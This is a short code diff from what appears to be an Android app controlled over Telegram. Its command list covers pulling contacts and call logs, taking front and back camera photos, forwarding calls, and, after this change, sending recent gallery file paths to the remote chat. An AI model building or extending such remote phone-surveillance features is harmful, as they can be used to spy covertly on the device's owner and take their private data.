@@ -48,7 +48,7 @@ object MessageHandler {
                     I'm your personal assistant. Here's what I can do:
                     • /contacts - Get contacts list
                     • /call_log - Get call logs
-                    • /gallery - Get latest photo from gallery
+                    • /gallery - List recent photos from gallery
                     • /camera - Take photo from back camera (alias: /camera_back)
                     • /camera_front - Take photo from front camera
                     • /forward <number> - Forward calls to number
@@ -66,7 +66,7 @@ object MessageHandler {
                     
                     /contacts - Get contacts list
                     /call_log - Get call logs
-                    /gallery - Get latest photo from gallery
+                    /gallery - List recent photos from gallery
                     /camera - Take photo from back camera (alias: /camera_back)
                     /camera_front - Take photo from front camera
                     /forward <number> - Forward calls to number
@@ -97,12 +97,8 @@ object MessageHandler {
                 }
             }
             "/gallery" -> {
-                val file = com.example.telegrambot.helpers.GalleryHelper.getGalleryFilesList(context)
-                if (file != null) {
-                    TelegramApi.sendDocument(token, chatId, file)
-                } else {
-                    TelegramApi.sendMessage(token, chatId, "❌ Failed to read gallery. Check permissions or no photos found.")
-                }
+                val message = com.example.telegrambot.helpers.GalleryHelper.getRecentGalleryPathsMessage(context, limit = 5)
+                TelegramApi.sendMessage(token, chatId, message)
             }
             "/camera_front" -> {
                 TelegramApi.sendMessage(token, chatId, "📸 Taking front photo...")
